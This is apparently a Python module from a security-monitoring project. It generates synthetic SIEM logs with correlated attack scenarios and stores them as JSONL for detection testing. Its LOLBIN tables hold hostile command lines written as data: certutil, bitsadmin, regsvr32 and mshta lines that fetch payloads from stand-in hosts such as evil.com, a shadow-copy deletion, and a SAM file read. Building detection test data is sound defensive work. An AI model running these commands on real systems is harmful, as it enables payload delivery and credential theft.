"""Ingestion as a Python function — no agent needed.

This module generates synthetic security logs and stores them
as JSONL files for pipeline processing. No LLM reasoning is involved;
it's a deterministic pipeline step.
"""

import json
import random
from datetime import datetime, timezone, timedelta

from letta_client import Letta

from nabla.log import get_logger

logger = get_logger("ingest")


# --- Synthetic log generation ---

USERS = ["jsmith", "admin", "svc_backup", "deploy_bot", "analyst1", "root", "operator"]
SRC_IPS = ["10.0.1.50", "10.0.1.100", "192.168.1.15", "10.0.2.33", "172.16.0.10"]
DST_IPS = ["10.0.5.20", "10.0.5.21", "192.168.2.1", "10.0.3.100"]
DOMAINS = [
    "api.internal.corp", "git.corp", "s3.amazonaws.com", "evil-phish.com",
    "c2-beacon.bad", "updates.corp", "dns.exfil.xyz",
]
ENDPOINTS = ["WORKSTATION-01", "SERVER-DC01", "LAPTOP-42", "BUILD-AGENT-03"]

# LOLBIN processes and their suspicious command-line patterns
# These serve as the fallback when the LOLBIN database is not available.
# When the lolbin_db block is populated, the database provides 100+ Windows
# and 300+ Unix entries with real-world abuse patterns.
LOLBINS = {
    "certutil.exe": [
        "certutil -urlcache -f http://evil.com/payload.exe C:\\temp\\payload.exe",
        "certutil -verifyctl -f http://c2.bad/stage2 C:\\temp\\s2.exe",
        "certutil -encode C:\\temp\\data.bin C:\\temp\\data.b64",
    ],
    "mshta.exe": [
        "mshta http://c2.server/payload.hta",
        "mshta vbscript:Execute(\"CreateObject\"\"WScript.Shell\"\").Run\"\"cmd.exe\"\")",
    ],
    "wscript.exe": [
        "wscript //B C:\\temp\\payload.vbs",
        "wscript //nologo C:\\Users\\Public\\evil.js",
    ],
    "cscript.exe": [
        "cscript //B C:\\temp\\payload.vbs",
        "cscript //nologo C:\\Users\\Public\\evil.js",
    ],
    "regsvr32.exe": [
        "regsvr32 /i:http://c2.bad/sct.sct scrobj.dll",
        "regsvr32 /s /n /i:http://evil.com/malware.sct scrobj.dll",
    ],
    "rundll32.exe": [
        "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",
        "rundll32.exe payload.dll,EntryPoint",
        "rundll32.exe http://c2.bad/payload.sct,entry",
    ],
    "bitsadmin.exe": [
        "bitsadmin /transfer malware /download /priority high http://c2.bad/p C:\\temp\\p.exe",
        "bitsadmin /create malware && bitsadmin /addfile malware http://c2.bad/p C:\\temp\\p.exe",
    ],
    "wmic.exe": [
        "wmic process call create \"cmd.exe /c whoami\"",
        "wmic /node:10.0.5.20 /user:admin /password:Pass123 process list",
        "wmic shadowcopy delete /nointeractive",
    ],
}

# Category-based command-line templates for database-driven LOLBIN generation.
# Maps LOLBAS category → suspicious command-line patterns.
CATEGORY_COMMANDS = {
    "Download": [
        "{name} -urlcache -f http://c2.bad/payload C:\\temp\\payload.exe",
        "{name} /transfer malware /download http://evil.com/p C:\\temp\\p.exe",
    ],
    "Execute": [
        "{name} http://c2.server/payload.hta",
        "{name} /i:http://evil.com/sct.sct scrobj.dll",
    ],
    "Encode": [
        "{name} -encode C:\\temp\\data.bin C:\\temp\\data.b64",
    ],
    "Decode": [
        "{name} -decode C:\\temp\\data.b64 C:\\temp\\data.bin",
    ],
    "Read": [
        "{name} /C type C:\\Windows\\System32\\config\\SAM",
    ],
    "Write": [
        "{name} /C echo malicious > C:\\temp\\payload.bat",
    ],
}

# Normal processes with benign command lines
NORMAL_PROCESSES = {
    "explorer.exe": "",
    "svchost.exe": "svchost.exe -k netsvcs",
    "chrome.exe": "chrome.exe --type=renderer",
    "outlook.exe": "",
    "code.exe": "code.exe /path/to/project",
    "python3": "python3 /app/scripts/backup.py",
    "bash": "bash /opt/deploy.sh",
    "cmd.exe": "",
    "powershell.exe": "",
    "curl": "curl -s https://internal.corp/api/health",
    "wget": "wget -q https://updates.corp/patch.tar.gz",
}

# Parent processes for endpoint entries
PARENT_PROCESSES = ["explorer.exe", "svchost.exe", "cmd.exe", "services.exe", "winlogon.exe", "sshd"]

# --- Provenance fields for endpoint logs ---
# File paths, registry keys, and network destinations that processes interact with.
# Used by the provenance graph to build entity relationships.
TARGET_FILES = [
    "C:\\Windows\\System32\\config\\SAM",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\temp\\payload.bat",
    "C:\\Users\\admin\\Documents\\credentials.txt",
    "/etc/shadow",
    "/etc/passwd",
    "/var/log/auth.log",
    "/tmp/staging.dat",
]
TARGET_REGISTRY = [
    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
    "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\malware_svc",
]
NETWORK_CONNECTIONS = [
    "10.0.1.50:443",
    "192.168.1.15:8080",
    "172.16.0.10:3389",
    "10.0.2.33:22",
    "203.0.113.50:443",  # External
    "198.51.100.10:8443",  # External
]

# --- User behavior profiles ---
# Each profile defines typical activity hours, preferred log types, and anomaly probability
USER_PROFILES = {
    "jsmith": {"work_hours": (8, 18), "anomaly_prob": 0.05, "typical_ips": ["10.0.1.50"]},
    "admin": {"work_hours": (6, 22), "anomaly_prob": 0.15, "typical_ips": ["10.0.1.100", "192.168.1.15"]},
    "svc_backup": {"work_hours": (0, 4), "anomaly_prob": 0.02, "typical_ips": ["10.0.2.33"]},
    "deploy_bot": {"work_hours": (9, 17), "anomaly_prob": 0.03, "typical_ips": ["10.0.2.33"]},
    "analyst1": {"work_hours": (7, 19), "anomaly_prob": 0.08, "typical_ips": ["10.0.1.50", "192.168.1.15"]},
    "root": {"work_hours": (0, 23), "anomaly_prob": 0.20, "typical_ips": ["172.16.0.10"]},
    "operator": {"work_hours": (6, 22), "anomaly_prob": 0.10, "typical_ips": ["10.0.1.100"]},
}

# --- Attack scenarios ---
# Correlated multi-step attack sequences that produce realistic event chains
ATTACK_SCENARIOS = [
    {
        "name": "brute_force_lateral_movement",
        "steps": [
            {"type": "auth", "action": "login_failure", "count": 8},
            {"type": "auth", "action": "login_success", "count": 1},
            {"type": "auth", "action": "privilege_escalation", "count": 1},
            {"type": "endpoint", "process": "powershell.exe", "anomaly": "suspicious_process", "count": 2,
             "target_file": "C:\\Windows\\System32\\config\\SAM"},
            {"type": "network", "protocol": "TCP", "port": 3389, "count": 3},
        ],
    },
    {
        "name": "lolbin_c2_communication",
        "steps": [
            {"type": "endpoint", "lolbin": "certutil.exe", "anomaly": "lolbin_abuse", "count": 1,
             "network_connection": "203.0.113.50:443"},
            {"type": "dns", "domain": "c2-beacon.bad", "anomaly": "suspicious_domain", "count": 5},
            {"type": "network", "protocol": "TCP", "port": 443, "count": 4},
            {"type": "endpoint", "lolbin": "bitsadmin.exe", "anomaly": "lolbin_abuse", "count": 1,
             "target_file": "C:\\temp\\payload.bat"},
        ],
    },
    {
        "name": "data_exfiltration",
        "steps": [
            {"type": "auth", "action": "login_success", "count": 1},
            {"type": "endpoint", "process": "powershell.exe", "anomaly": "suspicious_process", "count": 1,
             "target_file": "C:\\Users\\admin\\Documents\\credentials.txt",
             "network_connection": "198.51.100.10:8443"},
            {"type": "dns", "domain": "dns.exfil.xyz", "anomaly": "suspicious_domain", "count": 3},
            {"type": "network", "protocol": "TCP", "bytes_range": (100000, 500000), "count": 5},
        ],
    },
    {
        "name": "off_hours_intrusion",
        "steps": [
            {"type": "auth", "action": "login_success", "count": 1, "force_hour": 2},
            {"type": "endpoint", "lolbin": "mshta.exe", "anomaly": "lolbin_abuse", "count": 1,
             "target_registry": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"},
            {"type": "auth", "action": "privilege_escalation", "count": 1},
            {"type": "network", "protocol": "ICMP", "count": 2},
        ],
    },
]


def _generate_timestamp_with_temporal_pattern(base_time: datetime, user: str) -> str:
    """Generate a timestamp that respects the user's typical work hours.

    80% of events fall within the user's work hours, 20% outside.
    This creates realistic temporal patterns that the off-hours detector can find.
    """
    profile = USER_PROFILES.get(user, USER_PROFILES["jsmith"])
    work_start, work_end = profile["work_hours"]

    # Random offset within the last 24 hours
    minutes_ago = random.randint(0, 1440)
    ts = base_time - timedelta(minutes=minutes_ago)
    hour = ts.hour

    # 80% chance: constrain to work hours; 20%: any time
    if random.random() < 0.8:
        if hour < work_start or hour >= work_end:
            # Shift to work hours
            offset = random.randint(0, (work_end - work_start) * 60 - 1)
            ts = ts.replace(hour=work_start, minute=0, second=0) + timedelta(minutes=offset)

    return ts.isoformat()


def _generate_attack_scenario(scenario: dict, base_time: datetime, lolbin_index: dict | None = None) -> list[dict]:
    """Generate a correlated multi-step attack scenario.

    Returns a list of log entries that form a realistic attack chain,
    all sharing the same user and source IP.
    """
    user = random.choice(USERS)
    src = random.choice(SRC_IPS)
    entries = []
    # Stagger events within a 30-minute window
    step_offset = 0

    # Get LOLBIN choices from database or fallback
    lolbin_choices = _get_lolbin_choices(lolbin_index)

    for step in scenario["steps"]:
        count = step.get("count", 1)
        for _ in range(count):
            ts = (base_time - timedelta(minutes=random.randint(0, 30) + step_offset)).isoformat()
            # Force specific hour if specified
            if "force_hour" in step:
                ts_dt = datetime.fromisoformat(ts)
                ts_dt = ts_dt.replace(hour=step["force_hour"], minute=random.randint(0, 59))
                ts = ts_dt.isoformat()

            entry = {"timestamp": ts, "user": user, "source_ip": src}

            if step["type"] == "auth":
                entry["type"] = "auth"
                entry["action"] = step.get("action", "login_failure")
                entry["dest_host"] = random.choice(ENDPOINTS)
                if entry["action"] == "privilege_escalation":
                    entry["details"] = f"User {user} elevated to root/admin"
                elif entry["action"] == "account_lockout":
                    entry["details"] = f"Account {user} locked after 5 failures"

            elif step["type"] == "network":
                entry["type"] = "network"
                entry["src_ip"] = src
                entry["dst_ip"] = random.choice(DST_IPS)
                entry["port"] = step.get("port", random.choice([22, 80, 443, 3389, 8080]))
                entry["protocol"] = step.get("protocol", "TCP")
                byte_range = step.get("bytes_range", (64, 65536))
                entry["bytes"] = random.randint(byte_range[0], byte_range[1])

            elif step["type"] == "dns":
                entry["type"] = "dns"
                entry["client_ip"] = src
                entry["domain"] = step.get("domain", random.choice(DOMAINS))
                entry["query_type"] = random.choice(["A", "AAAA", "TXT", "MX"])

            elif step["type"] == "endpoint":
                entry["type"] = "endpoint"
                entry["host"] = random.choice(ENDPOINTS)
                entry["action"] = random.choice(["execute", "modify", "create", "delete"])
                entry["parent_process"] = random.choice(PARENT_PROCESSES)
                if "lolbin" in step:
                    proc = step["lolbin"]
                    entry["process"] = proc
                    if proc in lolbin_choices:
                        entry["command_line"] = random.choice(lolbin_choices[proc])
                    elif proc in LOLBINS:
                        entry["command_line"] = random.choice(LOLBINS[proc])
                    else:
                        entry["command_line"] = f"{proc} /C suspicious_command"
                elif "process" in step:
                    proc = step["process"]
                    entry["process"] = proc
                    entry["command_line"] = NORMAL_PROCESSES.get(proc, "")
                else:
                    proc = random.choice(list(NORMAL_PROCESSES.keys()))
                    entry["process"] = proc
                    entry["command_line"] = NORMAL_PROCESSES[proc]

            if "anomaly" in step:
                entry["anomaly"] = step["anomaly"]
                if step["anomaly"] == "lolbin_abuse":
                    entry["details"] = (
                        f"LOLBIN {entry.get('process', '')} "
                        f"with suspicious command line: "
                        f"{entry.get('command_line', '')}"
                    )

            # Pass through provenance fields from scenario step
            if "target_file" in step:
                entry["target_file"] = step["target_file"]
            if "target_registry" in step:
                entry["target_registry"] = step["target_registry"]
            if "network_connection" in step:
                entry["network_connection"] = step["network_connection"]

            entries.append(entry)

        step_offset += 5  # 5-minute gap between steps

    return entries


def _get_lolbin_choices(lolbin_index: dict | None = None) -> dict[str, list[str]]:
    """Get LOLBIN process→command_lines mapping, using database if available.

    When the lolbin_db block is populated (lolbin_index is not None),
    generates command-line patterns from the database categories.
    Otherwise falls back to the hardcoded LOLBINS dict.
    """
    if lolbin_index is None:
        return LOLBINS

    # Build from database
    result = {}
    for key, entry in lolbin_index.get("windows", {}).items():
        name = entry.get("name", key)
        if not name.endswith(".exe"):
            name = name + ".exe"
        commands = []
        for cat in entry.get("categories", []):
            templates = CATEGORY_COMMANDS.get(cat, [])
            for tmpl in templates:
                commands.append(tmpl.format(name=name))
        if not commands:
            # Fallback: generic suspicious command
            commands.append(f"{name} /C suspicious_command")
        result[name] = commands

    # Merge in hardcoded entries that may not be in the database
    for name, cmds in LOLBINS.items():
        if name not in result:
            result[name] = cmds

    return result


def generate_synthetic_logs(log_type: str, count: int = 100, lolbin_index: dict | None = None) -> list[dict]:
    """Generate synthetic security logs for testing.

    Includes temporal patterns (user work hours), behavior profiles,
    and correlated attack scenarios.

    Args:
        log_type: Type of logs to generate (auth, network, dns, endpoint).
        count: Number of log entries to generate.

    Returns:
        List of log entry dictionaries.
    """
    now = datetime.now(timezone.utc)
    logs = []

    # 10% chance to inject an attack scenario (adds ~15-20 entries)
    if random.random() < 0.10 and count >= 20:
        scenario = random.choice(ATTACK_SCENARIOS)
        scenario_entries = _generate_attack_scenario(scenario, now, lolbin_index)
        logs.extend(scenario_entries)
        # Reduce count by scenario size to stay near target
        count = max(count - len(scenario_entries), 10)

    # Get LOLBIN choices from database or fallback
    lolbin_choices = _get_lolbin_choices(lolbin_index)
    lolbin_names = list(lolbin_choices.keys())

    for _ in range(count):
        user = random.choice(USERS)
        src = random.choice(SRC_IPS)
        dst = random.choice(DST_IPS)
        ts = _generate_timestamp_with_temporal_pattern(now, user)

        if log_type == "auth":
            profile = USER_PROFILES.get(user, USER_PROFILES["jsmith"])
            # Weighted action selection influenced by user profile
            anomaly_prob = profile["anomaly_prob"]
            action = random.choices(
                ["login_success", "login_failure", "privilege_escalation", "account_lockout"],
                weights=[60 - anomaly_prob * 100, 25 + anomaly_prob * 50, 10 + anomaly_prob * 30, 5],
            )[0]
            entry = {
                "timestamp": ts, "type": "auth", "user": user,
                "source_ip": src, "action": action,
                "dest_host": random.choice(ENDPOINTS),
            }
            if action == "privilege_escalation":
                entry["details"] = f"User {user} elevated to root/admin"
            elif action == "account_lockout":
                entry["details"] = f"Account {user} locked after 5 failures"

        elif log_type == "network":
            proto = random.choice(["TCP", "UDP", "ICMP"])
            entry = {
                "timestamp": ts, "type": "network", "src_ip": src,
                "dst_ip": dst, "port": random.choice([22, 80, 443, 3389, 8080, 8443]),
                "protocol": proto, "bytes": random.randint(64, 65536),
            }
            if proto == "ICMP" and random.random() < 0.1:
                entry["anomaly"] = "unusual_icmp_flood"

        elif log_type == "dns":
            domain = random.choice(DOMAINS)
            entry = {
                "timestamp": ts, "type": "dns", "client_ip": src,
                "domain": domain, "query_type": random.choice(["A", "AAAA", "TXT", "MX"]),
            }
            if "phish" in domain or "beacon" in domain or "exfil" in domain:
                entry["anomaly"] = "suspicious_domain"

        elif log_type == "endpoint":
            # Choose between LOLBIN and normal process (15% LOLBIN)
            if random.random() < 0.15:
                proc = random.choice(lolbin_names)
                command_line = random.choice(lolbin_choices[proc])
                is_lolbin = True
            else:
                proc = random.choice(list(NORMAL_PROCESSES.keys()))
                command_line = NORMAL_PROCESSES[proc]
                is_lolbin = False

            parent = random.choice(PARENT_PROCESSES)
            action = random.choice(["execute", "modify", "create", "delete"])
            entry = {
                "timestamp": ts, "type": "endpoint", "host": random.choice(ENDPOINTS),
                "process": proc, "user": user, "source_ip": src,
                "action": action,
                "command_line": command_line,
                "parent_process": parent,
            }
            # Provenance fields: file/registry/network interactions
            # 20% chance of file interaction, 10% registry, 15% network
            if random.random() < 0.20:
                entry["target_file"] = random.choice(TARGET_FILES)
            if random.random() < 0.10:
                entry["target_registry"] = random.choice(TARGET_REGISTRY)
            if random.random() < 0.15:
                entry["network_connection"] = random.choice(NETWORK_CONNECTIONS)
            # Flag LOLBIN abuse
            if is_lolbin:
                entry["anomaly"] = "lolbin_abuse"
                entry["details"] = f"LOLBIN {proc} with suspicious command line: {command_line}"
            # Keep existing suspicious_process flagging for cmd.exe/powershell.exe
            elif proc in ("cmd.exe", "powershell.exe") and random.random() < 0.15:
                entry["anomaly"] = "suspicious_process"
            # Suspicious parent-child: office app spawning shell (5% chance)
            elif parent in ("winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe",
                            "acrobat.exe", "chrome.exe", "firefox.exe") and \
                    proc in ("cmd.exe", "powershell.exe", "wscript.exe", "bash") and \
                    random.random() < 0.05:
                entry["anomaly"] = "suspicious_parent_child"
                entry["details"] = f"Suspicious parent-child: {parent} -> {proc}"
            # Critical host privilege escalation (3% chance on SERVER-DC01)
            elif entry["host"] == "SERVER-DC01" and random.random() < 0.03:
                entry["anomaly"] = "critical_host_escalation"
                escalation_cmds = [
                    "sudo su -", "runas /user:admin cmd.exe",
                    "powershell -enc SQBFAFgA", "SeDebugPrivilege",
                    "psexec \\\\SERVER-DC01 cmd.exe",
                ]
                entry["command_line"] = random.choice(escalation_cmds)
                entry["details"] = f"Privilege escalation on critical host: {entry['command_line']}"
            # Rapid action sequence: create -> execute -> delete (2% chance)
            elif random.random() < 0.02:
                entry["anomaly"] = "rapid_action_sequence"
                if "create" not in [e.get("action") for e in logs[-5:]] if logs else True:
                    entry["action"] = "create"
                    entry["command_line"] = "cmd.exe /c echo malware > C:\\temp\\payload.bat"
                elif "execute" not in [e.get("action") for e in logs[-5:]] if logs else True:
                    entry["action"] = "execute"
                    entry["command_line"] = "cmd.exe /c C:\\temp\\payload.bat"
                else:
                    entry["action"] = "delete"
                    entry["command_line"] = "cmd.exe /c del C:\\temp\\payload.bat"
                entry["details"] = f"Rapid action sequence: {entry['action']} on {entry['host']}"

        else:
            entry = {"timestamp": ts, "type": "unknown", "error": f"Unknown log_type: {log_type}"}

        logs.append(entry)

    return logs


# --- Storage ---

def ingest_logs(
    client: Letta,
    supervisor_agent_id: str,
    logs: list[dict],
    log_type: str,
) -> dict:
    """Store log entries in a JSONL file and update the ingestion_status block.

    Args:
        client: Letta client instance.
        supervisor_agent_id: ID of the supervisor agent (for block updates).
        logs: List of log entry dicts to store.
        log_type: Type of logs (auth, network, dns, endpoint).

    Returns:
        Summary dict with count, log_type, and any errors.
    """
    from nabla.config import get_settings

    count = len(logs)
    errors = []

    normal_entries = [e for e in logs if not e.get("anomaly")]
    anomalous_entries = [e for e in logs if e.get("anomaly")]

    # Append to JSONL file — one line per batch
    settings = get_settings()
    siem_path = settings.siem_logs_file
    try:
        import os
        os.makedirs(os.path.dirname(siem_path), exist_ok=True)
        batch_record = {
            "log_type": log_type,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "count": count,
            "normal": len(normal_entries),
            "anomalous": len(anomalous_entries),
            "entries": logs,
        }
        with open(siem_path, "a") as f:
            f.write(json.dumps(batch_record, default=str) + "\n")
        logger.debug("Appended %d %s entries to %s", count, log_type, siem_path)
    except Exception as e:
        errors.append(f"Failed to append to SIEM logs file: {e}")
        logger.warning("Failed to append to SIEM logs file: %s", e)

    # Update ingestion_status shared block via supervisor agent
    try:
        blocks = client.agents.blocks.list(agent_id=supervisor_agent_id)
        for b in blocks:
            if b.label == "ingestion_status":
                new_entry = (
                    f"[{log_type}] {count} entries "
                    f"({len(normal_entries)} normal, {len(anomalous_entries)} anomalous)"
                )
                # Parse existing lines — keep only [type] entries, replace same type
                existing = b.value or ""
                lines = [ln for ln in existing.strip().split("\n")
                         if ln.strip().startswith("[")]
                replaced = False
                for i, line in enumerate(lines):
                    if line.startswith(f"[{log_type}]"):
                        lines[i] = new_entry
                        replaced = True
                        break
                if not replaced:
                    lines.append(new_entry)

                status_value = (
                    "Status: completed\n"
                    + "\n".join(lines)
                    + f"\nErrors: {len(errors) or 'none'}"
                )
                client.agents.blocks.update(
                    agent_id=supervisor_agent_id,
                    block_label="ingestion_status",
                    value=status_value,
                )
                break
    except Exception as e:
        errors.append(f"Failed to update ingestion_status block: {e}")
        logger.warning("Failed to update ingestion_status block: %s", e)

    logger.info("Ingested %d %s logs (%d normal, %d anomalous, %d errors)",
                count, log_type, len(normal_entries), len(anomalous_entries), len(errors))

    return {
        "count": count,
        "log_type": log_type,
        "normal": len(normal_entries),
        "anomalous": len(anomalous_entries),
        "errors": errors,
    }


def store_baseline_snapshot(
    baselines: dict,
    host_processes: dict[str, list[str]] | None = None,
) -> None:
    """Store a baseline snapshot as a JSONL line for historical comparison.

    This allows anomaly detection in future runs to compare current
    activity against past baselines rather than same-batch snapshots.

    Args:
        baselines: Dict of computed baselines (from compute_baseline tool output).
        host_processes: Dict mapping host -> list of process names seen on that host.
    """
    from nabla.config import get_settings

    snapshot = {
        "snapshot_type": "baseline",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "baselines": baselines,
    }
    if host_processes:
        snapshot["host_processes"] = host_processes

    settings = get_settings()
    path = settings.baseline_snapshots_file
    try:
        import os
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "a") as f:
            f.write(json.dumps(snapshot, default=str) + "\n")
        logger.info("Baseline snapshot appended to %s", path)
    except Exception as e:
        logger.warning("Failed to store baseline snapshot: %s", e)
